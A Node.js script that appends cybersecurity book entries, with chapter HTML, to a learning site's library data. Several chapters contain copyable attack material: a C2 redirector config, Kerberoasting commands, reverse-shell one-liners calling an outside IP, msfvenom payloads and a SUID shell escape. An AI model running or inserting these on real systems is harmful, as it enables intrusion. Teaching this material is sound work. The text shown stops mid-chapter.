const fs = require('fs');
const path = require('path');
const vm = require('vm');

const targetFilePath = path.join(__dirname, 'frontend', 'assets', 'js', 'technical-library-data.js');
const rawFile = fs.readFileSync(targetFilePath, 'utf8');

const sandbox = { window: {} };
vm.createContext(sandbox);
vm.runInContext(rawFile, sandbox);

const library = sandbox.window.PREPSPACE_LIBRARY;
if (!library || !library.books) {
  console.error('Could not load window.PREPSPACE_LIBRARY');
  process.exit(1);
}

// ------------------------------------------------------------------------------------------------
// 1. Add Cybersecurity Categories
// ------------------------------------------------------------------------------------------------
const cyberCategories = [
  {
    id: "cat-sec-penetration",
    name: "Ethical Hacking & Penetration Testing",
    icon: "fa-solid fa-user-secret",
    count: 3
  },
  {
    id: "cat-sec-mobile",
    name: "Mobile Security & Reverse Engineering",
    icon: "fa-brands fa-android",
    count: 1
  },
  {
    id: "cat-sec-network",
    name: "Network Security & Wireless Defense",
    icon: "fa-solid fa-wifi",
    count: 2
  },
  {
    id: "cat-sec-systems",
    name: "Linux Security & System Hardening",
    icon: "fa-brands fa-linux",
    count: 1
  },
  {
    id: "cat-sec-projects",
    name: "Hands-On Cyber Defense Projects",
    icon: "fa-solid fa-shield-halved",
    count: 1
  },
  {
    id: "cat-sec-intelligence",
    name: "Threat Intelligence & Tradecraft",
    icon: "fa-solid fa-crosshairs",
    count: 2
  }
];

cyberCategories.forEach(cat => {
  const existing = library.categories.find(c => c.id === cat.id || c.name === cat.name);
  if (!existing) {
    library.categories.push(cat);
  }
});

// Helper to make chapter content
function makeChapter(id, num, title, subtitle, summary, readingTime, contentHtml) {
  return {
    id: id,
    chapterNumber: num,
    title: title,
    subtitle: subtitle,
    summary: summary,
    readingTimeMinutes: readingTime,
    isFreePreview: num <= 2,
    sortOrder: num,
    contentHtml: contentHtml
  };
}

// ------------------------------------------------------------------------------------------------
// 2. Define 10 Cybersecurity Master Books (201 - 210)
// ------------------------------------------------------------------------------------------------

// BOOK 201: The Hacker Playbook 3
const book201 = {
  id: 201,
  slug: "the-hackers-playbook-3-red-team",
  title: "The Hacker Playbook 3: Practical Guide to Penetration Testing (Red Team Edition)",
  subtitle: "Campaign Infrastructure, Weaponization, Active Directory, Lateral Movement & Evasion",
  description: "The premier red teaming tactical handbook by Peter Kim. Master enterprise threat emulation, Cobalt Strike campaign deployment, Active Directory Kerberoasting, LSASS memory dumping, pass-the-hash lateral movement, and advanced EDR evasion techniques.",
  author: "Peter Kim",
  category: "Ethical Hacking & Penetration Testing",
  subcategory: "Red Teaming & Offensive Security",
  difficulty: "ADVANCED",
  pageCount: 312,
  estimatedReadingTime: "14 Hours",
  fileSize: "8.99 MB",
  downloadUrl: "downloads/cybersecurity/the-hackers-playbook-3.pdf",
  tags: ["PenetrationTesting", "RedTeam", "ActiveDirectory", "CobaltStrike", "Mimikatz", "LateralMovement", "Evasion"],
  licenseType: "EDUCATIONAL REFERENCE",
  copyrightNotice: "© Peter Kim / CyberMindSpace. Integrated for authorized educational reference.",
  isPro: false,
  badge: "Red Team Flagship",
  rating: 4.98,
  readerCount: 4120,
  icon: "fa-solid fa-skull-crossbones",
  gradient: "linear-gradient(135deg, #7f1d1d, #ef4444)",
  chapters: [
    makeChapter(20101, 1, "Setting Up Red Team Infrastructure & Redirectors", "Domain Fronting, HTTPS Reverse Proxies & Bulletproof C2 Architecture", 
      "Build resilient command-and-control (C2) infrastructure using Apache/Nginx reverse redirectors, automated SSL certificates, and DNS reputation rotation.", 26, `
      <h3>1.1 Architecture of Modern Red Team Infrastructure</h3>
      <p>Modern endpoint detection and network monitoring systems immediately flag direct connections from victim endpoints to unvetted IP addresses. Enterprise red team operations separate the <strong>Core Team Server</strong> from victim-facing communication using a multi-tiered redirector topology.</p>
      
      <pre class="bg-dark text-cyan p-3 rounded font-monospace fs-8">
+---------------------+           HTTPS (Port 443)           +--------------------------+
|  Compromised Host   | -----------------------------------> |  Edge Nginx Redirector   | (Categorized High-Rep Domain)
|  (Beacon Agent)     |                                      +--------------------------+
+---------------------+                                                   |
                                                                          v Reverse Proxy Header Filter
                                                             +--------------------------+
                                                             |  Hidden C2 Team Server   | (Cobalt Strike / Sliver)
                                                             +--------------------------+
      </pre>

      <div class="book-callout-theorem">
        <h5><i class="fa-solid fa-shield-halved me-2"></i>Nginx C2 Redirector Hardening Rule</h5>
        <p>A legitimate redirector must inspect incoming HTTP headers (e.g., specific User-Agents, custom cookies, or Malleable C2 profiles). Any non-matching requests (such as automated security scanners like Shodan or Censys) must be redirected to a decoy URL (e.g. <code>https://www.google.com</code>) with HTTP 302.</p>
      </div>

      <div class="book-code-block">
        <div class="book-code-header"><span>Nginx Configuration — C2 Malleable Header Redirector</span><button class="btn btn-xs btn-outline-warning" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText)">Copy</button></div>
        <pre><code>server {
    listen 443 ssl http2;
    server_name telemetry.trusted-cloud.com;

    ssl_certificate /etc/letsencrypt/live/trusted-cloud.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/trusted-cloud.com/privkey.pem;

    # Forward only beacons matching the secret Malleable C2 header
    location /analytics/collect {
        if ($http_x_api_token != "SecretBeaconToken99x") {
            return 302 https://www.microsoft.com;
        }
        proxy_pass https://10.0.0.5:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_ssl_verify off;
    }

    # Catch-all: Decoy redirection for security crawlers
    location / {
        return 302 https://www.microsoft.com;
    }
}</code></pre>
      </div>
    `),
    makeChapter(20102, 2, "External Reconnaissance & OSINT Weaponization", "Shodan, Amass, GitHub Secret Scrapers & Cloud Bucket Discovery", 
      "Discover enterprise attack surfaces using passive DNS enumeration, open cloud storage bucket identification, and automated credential leakage monitoring.", 24, `
      <h3>2.1 Passive Reconnaissance vs Active Scanning</h3>
      <p>Passive reconnaissance gathers operational intelligence on an organization without transmitting a single packet directly to target infrastructure. This minimizes telemetry triggers in the target's Security Operations Center (SOC) and SIEM.</p>
      <ul>
        <li><strong>Certificate Transparency Logs (crt.sh):</strong> Discover unlisted subdomains and staging environments instantly.</li>
        <li><strong>Cloud Asset Enumeration:</strong> Scan AWS S3, Azure Blob Storage, and GCP Storage for public read permissions.</li>
        <li><strong>GitHub Dorking:</strong> Uncover leaked AWS access keys, database passwords, and internal API endpoints in public developer repositories.</li>
      </ul>
    `),
    makeChapter(20103, 3, "Evading Modern Endpoint Detection & Response (EDR)", "Direct System Calls, Syswhispers & AMSI Memory Patching", 
      "Bypass EDR API hooks in user space using unhooked NT system calls, dynamic base relocation, and runtime memory patching.", 30, `
      <h3>3.1 How EDRs Monitor Userland Processes</h3>
      <p>Most Endpoint Detection and Response (EDR) solutions (such as CrowdStrike Falcon, SentinelOne, and Microsoft Defender for Endpoint) inject a monitoring DLL into newly spawned processes. This DLL patches standard Windows API functions in <code>ntdll.dll</code> (e.g., <code>NtAllocateVirtualMemory</code>, <code>NtWriteVirtualMemory</code>, <code>NtCreateThreadEx</code>) with <code>JMP</code> instructions that redirect execution into the EDR sensor for inspection.</p>

      <div class="book-callout-warning">
        <h5><i class="fa-solid fa-triangle-exclamation me-2"></i>Bypassing API Hooks via Direct Syscalls</h5>
        <p>By extracting the raw System Service Numbers (SSNs) and issuing the <code>syscall</code> CPU assembly instruction directly, an offensive binary completely bypasses the hooked <code>ntdll.dll</code> wrappers and enters the Windows kernel directly without triggering userland EDR detection.</p>
      </div>
    `),
    makeChapter(20104, 4, "Active Directory Enumeration & Kerberoasting", "BloodHound Graph Analysis, SPN Scanning & Offline TGS Cracking", 
      "Map domain trust relationships with BloodHound and extract service account Ticket Granting Service (TGS) tickets for offline GPU hash cracking.", 32, `
      <h3>4.1 The Mechanics of Kerberoasting</h3>
      <p>Kerberoasting allows any valid domain user (even low-privileged accounts) to request a Service Ticket (TGS) from the Active Directory Key Distribution Center (KDC) for any service that has a registered Service Principal Name (SPN). Because the TGS ticket is encrypted with the NTLM hash of the target service account, an attacker can extract the ticket from memory and crack the plaintext password offline using Hashcat.</p>

      <div class="book-code-block">
        <div class="book-code-header"><span>PowerShell / Rubeus — Requesting & Roasting SPN Tickets</span><button class="btn btn-xs btn-outline-warning" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText)">Copy</button></div>
        <pre><code># 1. Enumerate all SPNs registered in the Active Directory domain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, memberOf

# 2. Extract and Kerberoast TGS hashes using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /format:hashcat

# 3. Crack offline on GPU rig using Hashcat (Mode 13100 = Kerberos 5 TGS-REP)
hashcat -m 13100 -a 0 hashes.kerberoast rockyou.txt --rules-file=OneRuleToRuleThemAll.rule</code></pre>
      </div>
    `),
    makeChapter(20105, 5, "Lateral Movement via WMI, WinRM & Pass-the-Hash", "Remote Process Spawning, DCOM & Kerberos Overpass-the-Hash", 
      "Pivot across network segments using native administrative protocols and cached NTLM credential hashes without triggering firewall alerts.", 28, `
      <h3>5.1 Pass-the-Hash (PtH) Protocol Mechanics</h3>
      <p>The NTLM authentication protocol relies on password hashes rather than plaintext passwords. If an attacker dumps an administrator's NTLM hash from the LSASS memory of a compromised workstation, they can authenticate to other workstations and domain servers over SMB/RPC without ever needing to decrypt the plaintext password.</p>
    `),
    makeChapter(20106, 6, "Privilege Escalation & Mimikatz Memory Extraction", "LSASS Process Dumping, SeDebugPrivilege & Token Impersonation", 
      "Elevate privileges from local user to SYSTEM, dump memory credentials, and forge Kerberos Golden and Silver tickets.", 30, `
      <h3>6.1 Forging Golden Tickets (Kerberos Domain Takeover)</h3>
      <p>If the Active Directory <code>KRBTGT</code> account password hash is compromised, an attacker can forge a <strong>Golden Ticket</strong>: a custom Kerberos Ticket Granting Ticket (TGT) granting arbitrary domain administrator privileges, valid for 10 years, which persists even if all domain passwords are changed.</p>
    `),
    makeChapter(20107, 7, "Command & Control (C2) Architecture & Beacons", "Jittered Polling, Asynchronous Sleep & Encrypted Payloads", 
      "Configure beacon sleep masks, memory obfuscation (Sleep Obfuscation), and multi-channel fallback communication.", 24, `
      <h3>7.1 Sleep Obfuscation & Jitter</h3>
      <p>Static beacon check-in intervals (e.g. exactly every 60 seconds) produce obvious periodicity spikes in network traffic analysis. Red team beacons apply <strong>Sleep Jitter</strong> (e.g. 60s with 30% jitter checks in randomly between 42s and 78s) and encrypt the beacon memory space with a dynamic XOR key while sleeping to evade memory scanners.</p>
    `),
    makeChapter(20108, 8, "Post-Exploitation Persistence & Exfiltration", "WMI Event Subscriptions, Scheduled Tasks & Covert Data Channels", 
      "Establish resilient covert persistence mechanisms and exfiltrate sensitive data over encrypted DNS and ICMP tunnels.", 26, `
      <h3>8.1 Covert DNS Tunneling Exfiltration</h3>
      <p>DNS queries are almost universally permitted through corporate firewalls without authentication. By encoding exfiltrated files into base64 subdomain labels (e.g. <code>b64data.tunnel.attacker-domain.com</code>), data reaches the attacker's authoritative nameserver completely bypassing web proxies.</p>
    `)
  ]
};

// BOOK 202: Hacking: The Art of Exploitation
const book202 = {
  id: 202,
  slug: "hacking-the-art-of-exploitation",
  title: "Hacking: The Art of Exploitation (2nd Edition)",
  subtitle: "C Systems Architecture, Stack Buffer Overflows, Shellcode & Cryptology",
  description: "The timeless binary exploitation masterclass by Jon Erickson. Learn the exact physics of computer memory, x86 assembly, CPU registers, stack-based buffer overflows, shellcode development, format string exploits, and cryptographic mathematical attacks.",
  author: "Jon Erickson",
  category: "Ethical Hacking & Penetration Testing",
  subcategory: "Binary Exploitation & Memory Safety",
  difficulty: "ADVANCED",
  pageCount: 488,
  estimatedReadingTime: "18 Hours",
  fileSize: "5.68 MB",
  downloadUrl: "downloads/cybersecurity/hacking-art-of-exploitation.pdf",
  tags: ["Exploitation", "BufferOverflow", "C", "Shellcode", "Assembly", "GDB", "MemoryCorruption"],
  licenseType: "EDUCATIONAL REFERENCE",
  copyrightNotice: "© Jon Erickson / No Starch Press. Integrated for authorized educational reference.",
  isPro: false,
  badge: "Classic Masterwork",
  rating: 4.97,
  readerCount: 3950,
  icon: "fa-solid fa-microchip",
  gradient: "linear-gradient(135deg, #1e1e24, #64748b)",
  chapters: [
    makeChapter(20201, 1, "Low-Level C Programming & Memory Architecture", "Stack, Heap, Data & Text Segments in Von Neumann Architecture", 
      "Understand the low-level virtual memory mapping of running C programs, memory segment boundaries, and pointer arithmetic.", 24, `
      <h3>1.1 Virtual Memory Layout of a C Process</h3>
      <pre class="bg-dark text-cyan p-3 rounded font-monospace fs-8">
Higher Memory (0xFFFFFFFF)  +-----------------------------------+
                            |     Environment & Arguments       |
                            +-----------------------------------+
                            |     STACK (Grows Downward v)      |
                            |  [Local Variables, Frame Ptrs]    |
                            +-----------------------------------+
                            |                 |                 |
                            |                 v                 |
                            |                 ^                 |
                            |                 |                 |
                            +-----------------------------------+
                            |     HEAP (Grows Upward ^)         |
                            |  [malloc(), calloc() objects]     |
                            +-----------------------------------+
                            |     BSS (Uninitialized Globals)   |
                            +-----------------------------------+
                            |     DATA (Initialized Globals)    |
                            +-----------------------------------+
Lower Memory (0x08048000)   |     TEXT (Compiled Binary Code)   |
                            +-----------------------------------+
      </pre>
    `),
    makeChapter(20202, 2, "Disassembly, Registers & GDB Debugger Internals", "x86 CPU Registers, Instruction Pointer (EIP) & Stack Pointers (ESP/EBP)", 
      "Master the GNU Debugger (GDB) for inspecting CPU state, stepping through instructions, and analyzing stack frame construction.", 26, `
      <h3>2.1 CPU Registers & Function Call Frames</h3>
      <p>In 32-bit x86 architecture, the primary registers governing execution flow are:</p>
      <ul>
        <li><code>EIP (Instruction Pointer):</code> Contains the memory address of the next machine instruction to be executed by the CPU.</li>
        <li><code>ESP (Stack Pointer):</code> Points to the current top of the stack frame.</li>
        <li><code>EBP (Base / Frame Pointer):</code> Points to the base of the current local function frame, used as a reference anchor for local variables (<code>[EBP - 4]</code>) and function arguments (<code>[EBP + 8]</code>).</li>
      </ul>
    `),
    makeChapter(20203, 3, "Stack-Based Buffer Overflows & EIP Overwriting", "Unsafe C Functions (strcpy, gets), Off-By-One & Return Address Control", 
      "Explore how unbounded buffer copies overwrite adjacent memory, hijack the stored EIP return address, and redirect execution flow.", 30, `
      <h3>3.1 Anatomy of a Stack Overflow</h3>
      <p>When an unsafe C function like <code>strcpy()</code> copies user input into a fixed-size stack buffer without bounds verification, excess bytes overwrite the saved Base Pointer (EBP) and the saved Return Address (EIP):</p>
      
      <div class="book-code-block">
        <div class="book-code-header"><span>C — Vulnerable Buffer Function</span><button class="btn btn-xs btn-outline-warning" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText)">Copy</button></div>
        <pre><code>#include &lt;string.h&gt;

void vulnerable_function(char *str) {
    char buffer[64];
    // Unbounded copy: If str > 64 bytes, overwrites saved EBP and saved EIP!
    strcpy(buffer, str);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}</code></pre>
      </div>
    `),
    makeChapter(20204, 4, "Writing Position-Independent x86/x64 Shellcode", "Null-Free Assembly, NOP Sleds & System Call Invocation", 
      "Write compact, position-independent machine code (shellcode) to spawn root shells (`/bin/sh`) without containing terminating null bytes (`\\x00`).", 28, `
      <h3>4.1 Eliminating Null Bytes in Shellcode</h3>
      <p>Because C string functions treat <code>0x00</code> as a string terminator, shellcode must avoid generating null bytes. Assembly instructions like <code>mov eax, 0</code> (which compiles to <code>B8 00 00 00 00</code>) are replaced with <code>xor eax, eax</code> (which compiles to <code>31 C0</code> with zero null bytes).</p>
    `),
    makeChapter(20205, 5, "Format String Vulnerabilities & Arbitrary Memory Writes", "Direct Parameter Access (%x, %s, %n) & GOT Table Overwrites", 
      "Manipulate printf format specifiers to read arbitrary memory and write memory addresses using the %n format token.", 26, `
      <h3>5.1 The Dangerous %n Specifier</h3>
      <p>The <code>%n</code> format specifier does not print data; instead, it writes the number of characters printed so far into the memory address supplied as an argument. By carefully controlling field widths (e.g. <code>%100u%n</code>), an attacker can write arbitrary 4-byte integers into any memory location.</p>
    `),
    makeChapter(20206, 6, "Network Sniffing, Raw Sockets & Packet Injection", "Promiscuous Mode, BPF Filters & TCP Reset Hijacking", 
      "Build custom raw network socket sniffers, dissect ethernet and IP headers in C, and forge spoofed TCP packets.", 26, `
      <h3>6.1 Raw Sockets in C</h3>
      <p>Opening a socket with <code>socket(AF_INET, SOCK_RAW, IPPROTO_RAW)</code> allows a program to bypass the operating system's standard TCP/IP network stack, enabling the manual construction and transmission of custom IP headers with spoofed source IP addresses.</p>
    `),
    makeChapter(20207, 7, "Cryptology, RSA Mathematics & Hash Collision Attacks", "Modular Arithmetic, Fermat's Little Theorem & MD5 Collisions", 
      "Master the mathematical foundations of public-key cryptography (RSA, Diffie-Hellman), prime factorization, and hash collision vulnerabilities.", 28, `
      <h3>7.1 Mathematical Foundations of RSA</h3>
      <p>RSA security rests on the computational hardness of factoring large integers N = p * q. Euler's totient function phi(N) = (p-1)(q-1) enables computing the private decryption exponent d = e^-1 mod phi(N).</p>
    `),
    makeChapter(20208, 8, "Modern Mitigation Bypasses (ASLR, DEP/NX, Stack Canaries)", "Return-Oriented Programming (ROP), ret2libc & Canary Leakage", 
      "Defeat modern OS memory protections using Return-Oriented Programming (ROP chains), Libc redirection, and info leaks.", 32, `
      <h3>8.1 Return-Oriented Programming (ROP)</h3>
      <p>When Data Execution Prevention (DEP / NX) marks the stack as non-executable, attackers string together short snippets of executable instructions already present in binary memory ending in <code>RET</code> (known as <strong>ROP Gadgets</strong>) to achieve arbitrary code execution.</p>
    `)
  ]
};

// BOOK 203: Kali Linux & CTF Command Guide
const book203 = {
  id: 203,
  slug: "kali-linux-ctf-command-guide",
  title: "Kali Linux & CTF Command Guide",
  subtitle: "Tactical Cheat Sheets for Nmap, Metasploit, Burp Suite, Hydra & Hashcat",
  description: "The complete hands-on offensive security command reference by Cyber Mind Space. Features ready-to-run terminal syntax, flag explanations, pipeline tricks, and privilege escalation methodologies for Capture-The-Flag (CTF) challenges and penetration tests.",
  author: "Cyber Mind Space",
  category: "Ethical Hacking & Penetration Testing",
  subcategory: "CTF & Tactical Tooling",
  difficulty: "INTERMEDIATE",
  pageCount: 142,
  estimatedReadingTime: "6 Hours",
  fileSize: "0.75 MB",
  downloadUrl: "downloads/cybersecurity/kali-linux-ctf-command-guide.pdf",
  tags: ["KaliLinux", "CTF", "Nmap", "Metasploit", "BurpSuite", "Hydra", "Hashcat", "PrivilegeEscalation"],
  licenseType: "TACTICAL REFERENCE",
  copyrightNotice: "© Cyber Mind Space. Integrated for authorized educational reference.",
  isPro: false,
  badge: "CTF Essential",
  rating: 4.92,
  readerCount: 4300,
  icon: "fa-brands fa-linux",
  gradient: "linear-gradient(135deg, #0284c7, #38bdf8)",
  chapters: [
    makeChapter(20301, 1, "Essential Linux CLI Commands & Pipeline Mastery", "Grep, Awk, Sed, Netcat & Reverse Shell Spawning", 
      "Master the essential Linux terminal command line utilities, stream editing pipelines, and one-liner interactive reverse shells.", 20, `
      <h3>1.1 High-Yield Terminal Reverse Shell One-Liners</h3>
      <div class="book-code-block">
        <div class="book-code-header"><span>Bash / Python / Netcat Reverse Shells</span><button class="btn btn-xs btn-outline-warning" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText)">Copy</button></div>
        <pre><code># Bash TCP Reverse Shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python 3 PTY Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Upgrading Dumb Shell to Fully Interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background, then on your local machine:
stty raw -echo; fg
export TERM=xterm-256color</code></pre>
      </div>
    `),
    makeChapter(20302, 2, "Network Scanning & Port Enumeration with Nmap", "SYN Steath Scan, Service Versioning, NSE Scripts & Firewall Evasion", 
      "Execute high-speed port scans, detect OS fingerprints, and leverage Nmap Scripting Engine (NSE) vulnerability scripts.", 22, `
      <h3>2.1 Optimal Nmap Scan Strategy</h3>
      <div class="book-code-block">
        <div class="book-code-header"><span>Nmap Command Line Cheat Sheet</span><button class="btn btn-xs btn-outline-warning" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText)">Copy</button></div>
        <pre><code># Step 1: Fast all-port TCP discovery
nmap -p- --min-rate=2000 -T4 -Pn 10.10.10.100 -oN nmap_allports.txt

# Step 2: In-depth Service & Vulnerability Script scan on discovered ports
nmap -p 22,80,443,8080 -sC -sV -A -T4 10.10.10.100 -oN nmap_detailed.txt

# Step 3: Run targeted vulnerability scripts
nmap -p 445 --script smb-vuln* 10.10.10.100</code></pre>
      </div>
    `),
    makeChapter(20303, 3, "Web Application Auditing with Burp Suite & Gobuster", "Directory Fuzzing, Parameter Brute-Forcing & SQL Injection", 
      "Discover hidden endpoints, fuzz APIs with ffuf/gobuster, and intercept HTTP traffic with Burp Suite Proxy.", 22, `
      <h3>3.1 High-Speed Directory & API Fuzzing</h3>
      <div class="bg-black p-3 rounded font-monospace text-warning fs-8 my-2">
        # Gobuster directory discovery with common wordlist<br>
        gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,json -t 50 -o gobuster.txt<br><br>
        # FFUF parameter discovery<br>
        ffuf -u http://10.10.10.100/index.php?FUZZ=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 240
      </div>
    `),
    makeChapter(20304, 4, "Password Auditing with Hydra, John & Hashcat", "Online Brute-Forcing & High-Performance GPU Hash Cracking", 
      "Audit passwords over SSH/FTP/RDP with Hydra and crack NTLM, SHA-512, and bcrypt hashes using Hashcat.", 24, `
      <h3>4.1 Cracking Password Hashes with Hashcat</h3>
      <div class="table-responsive my-2">
        <table class="table table-dark table-bordered table-striped fs-8">
          <thead><tr><th>Hash Type</th><th>Hashcat Mode</th><th>Example Syntax</th></tr></thead>
          <tbody>
            <tr><td>MD5</td><td><code>-m 0</code></td><td><code>hashcat -m 0 hashes.txt rockyou.txt</code></td></tr>
            <tr><td>SHA-256</td><td><code>-m 1400</code></td><td><code>hashcat -m 1400 hashes.txt rockyou.txt</code></td></tr>
            <tr><td>NTLM (Windows)</td><td><code>-m 1000</code></td><td><code>hashcat -m 1000 hashes.txt rockyou.txt</code></td></tr>
            <tr><td>Linux Shadow (SHA-512)</td><td><code>-m 1800</code></td><td><code>hashcat -m 1800 shadow.txt rockyou.txt</code></td></tr>
          </tbody>
        </table>
      </div>
    `),
    makeChapter(20305, 5, "Metasploit Framework Exploitation & Payloads", "msfconsole Workflow, Meterpreter Post-Exploitation & Msfvenom", 
      "Generate custom stagers with msfvenom, configure multi-handlers, and execute automated post-exploitation modules.", 22, `
      <h3>5.1 Generating Payloads with Msfvenom</h3>
      <div class="bg-black p-3 rounded font-monospace text-info fs-8 my-2">
        # Linux x64 Meterpreter reverse TCP ELF binary<br>
        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf<br><br>
        # Windows x64 Meterpreter reverse HTTPS executable<br>
        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=8443 -f exe -o payload.exe
      </div>
    `),
    makeChapter(20306, 6, "Linux Privilege Escalation (LinPEAS & SUID Vectors)", "Sudo Misconfigurations, Capabilities, SUID Binaries & Cron Jobs", 
      "Enumerate misconfigured sudo privileges (GTFOBins), exploitable SUID binaries, and writable system paths to gain root.", 24, `
      <h3>6.1 Exploiting SUID Binaries (GTFOBins)</h3>
      <div class="bg-black p-3 rounded font-monospace text-warning fs-8 my-2">
        # Discover all SUID binaries on the filesystem<br>
        find / -perm -u=s -type f 2>/dev/null<br><br>
        # Example: If /usr/bin/find has SUID bit set<br>
        /usr/bin/find . -exec /bin/sh -p \\; -quit
      </div>
    `),
    makeChapter(20307, 7, "Windows Privilege Escalation (WinPEAS & Token Impersonation)", "Unquoted Service Paths, AlwaysInstallElevated & SeImpersonatePrivilege", 
      "Elevate privileges from standard user to SYSTEM on Windows using Potato exploits (JuicyPotato, SweetPotato) and unquoted paths.", 24, `
      <h3>7.1 SeImpersonatePrivilege & Potato Exploits</h3>
      <p>When executing under a service account (such as <code>IIS APPPOOL</code> or <code>LOCAL SERVICE</code>) possessing <code>SeImpersonatePrivilege</code>, attackers can force a SYSTEM service to authenticate to a local named pipe and steal the primary SYSTEM token to spawn an elevated shell.</p>
    `),
    makeChapter(20308, 8, "CTF Flag Hunting Strategy & Report Writing", "Time Management, Methodical Notes & High-Quality Vulnerability Reporting", 
      "Structured methodologies for navigating competitive CTFs (HackTheBox, TryHackMe) and creating executive penetration test deliverables.", 20, `
      <h3>8.1 The Systematic CTF Attack Loop</h3>
      <ol>
        <li><strong>Port Enumeration:</strong> Scan all 65,535 TCP ports + Top 100 UDP ports.</li>
        <li><strong>Web Fuzzing:</strong> Check robots.txt, source comments, hidden endpoints, and API parameters.</li>
        <li><strong>Initial Foothold:</strong> Search public CVE databases (Exploit-DB) and test for command injection / file upload vulnerabilities.</li>
        <li><strong>Internal Enumeration:</strong> Run LinPEAS / WinPEAS to identify local privilege escalation paths.</li>
      </ol>
    `)
  ]
};

// BOOK 204: Android Hacker's Handbook
const book204 = {
  id: 204,
  slug: "android-hackers-handbook",
  title: "Android Hacker's Handbook",
  subtitle: "Operating System Internals, APK Reversing, Binder IPC & ARM Exploitation",
  description: "The authoritative deep dive into Android mobile security by leading vulnerability researchers. Covers Android security architecture, Linux kernel sandboxing, Binder IPC mechanisms, Dalvik/ART bytecode reverse engineering, dynamic instrumentation with Frida, and ARM memory safety.",
  author: "Joshua J. Drake, Zach Lanier, Collin Mulliner, Pau Oliva, Stephen A. Ridley, Georg Wicherski",
  category: "Mobile Security & Reverse Engineering",
  subcategory: "Android Security & Reverse Engineering",
  difficulty: "ADVANCED",
  pageCount: 576,
  estimatedReadingTime: "20 Hours",
  fileSize: "9.03 MB",
  downloadUrl: "downloads/cybersecurity/android-hackers-handbook.pdf",
  tags: ["Android", "MobileSecurity", "ReverseEngineering", "APK", "Smali", "BinderIPC", "ARM", "Frida"],
  licenseType: "EDUCATIONAL REFERENCE",
  copyrightNotice: "© Wiley Publishing. Integrated for authorized educational reference.",
  isPro: false,
  badge: "Mobile Masterclass",
  rating: 4.96,
  readerCount: 3880,
  icon: "fa-brands fa-android",
  gradient: "linear-gradient(135deg, #15803d, #4ade80)",
  chapters: [
    makeChapter(20401, 1, "Android Security Model & Sandbox Architecture", "Linux UID Isolation, App Sandbox, SELinux & Permission Framework", 
      "Understand how Android assigns unique Linux UIDs to applications to enforce kernel-level process isolation and MAC policies.", 26, `
      <h3>1.1 Multi-User Sandbox Architecture</h3>
      <p>Android utilizes the Linux kernel's multi-user infrastructure to implement its <strong>Application Sandbox</strong>. Each installed application is assigned a unique User ID (UID, e.g. <code>u0_a145</code>) and a dedicated home directory (<code>/data/data/com.example.app</code>) with permissions <code>rwx------</code>, completely isolating files from other applications on the device.</p>
    `),
    makeChapter(20402, 2, "Android Hardware Ecosystem & Rooting Mechanisms", "Bootloaders, TrustZone, Fastboot & Kernel Vulnerabilities", 
      "Explore bootloader unlocking, Qualcomm/Exynos TrustZone execution environments, and historical kernel exploit chains (Towelroot, Dirty COW).", 28, `
      <h3>2.1 Secure Boot & Chain of Trust</h3>
      <p>The Android boot process executes a cryptographic chain of trust: Boot ROM (PBL) $\\to$ Secondary Bootloader (SBL) $\\to$ TrustZone / TEE $\\to$ Android Bootloader (ABOOT) $\\to$ Linux Kernel. Rooting requires either authorized bootloader unlocking via Fastboot or exploiting a kernel memory vulnerability.</p>
    `),
    makeChapter(20403, 3, "Dalvik, ART & Smali Bytecode Disassembly", "DEX File Format, OAT Files & Smali Instruction Reversing", 
      "Analyze DEX headers, constant pools, and bytecode instructions to disassemble and patch compiled Android apps.", 28, `
      <h3>3.1 The DEX File Format</h3>
      <p>Android applications compile Java/Kotlin source into Dalvik Executable (<code>.dex</code>) format containing compact register-based bytecode. Tools like <code>apktool</code> disassemble DEX files into readable <strong>Smali Assembly</strong>, allowing code modification and re-packaging.</p>
    `),
    makeChapter(20404, 4, "Binder IPC Communication & Intent Spoofing", "Services, Content Providers, Broadcast Receivers & PendingIntents", 
      "Audit Android inter-process communication (IPC) for unprotected exported components and privilege escalation via Binder.", 26, `
      <h3>4.1 Binder Driver Architecture</h3>
      <p>Binder is the core kernel-level IPC mechanism in Android, allowing processes to invoke methods on remote objects using memory sharing. Misconfigured exported components without permission checks allow unauthorized third-party apps to trigger privileged background actions.</p>
    `),
    makeChapter(20405, 5, "Native Code Exploitation & Memory Safety on ARM", "JNI Bridges, Shared Libraries (.so) & ARM Assembly Exploits", 
      "Examine native C/C++ libraries compiled into APKs for stack buffer overflows and heap vulnerabilities on ARM64 processors.", 30, `
      <h3>5.1 JNI Memory Vulnerabilities</h3>
      <p>When Android applications use the Java Native Interface (JNI) to invoke C/C++ shared libraries (<code>libnative.so</code>), Java's managed memory guarantees cease, exposing the application to classic binary exploitation vulnerabilities.</p>
    `),
    makeChapter(20406, 6, "Reverse Engineering APKs with Jadx, Apktool & Ghidra", "Static Analysis, Cryptographic Key Extraction & App Modification", 
      "Decompile APKs into clean Java code, extract hardcoded secret keys, and modify Smali logic to bypass license checks.", 24, `
      <h3>6.1 Step-by-Step APK Modification with Apktool</h3>
      <div class="bg-black p-3 rounded font-monospace text-warning fs-8 my-2">
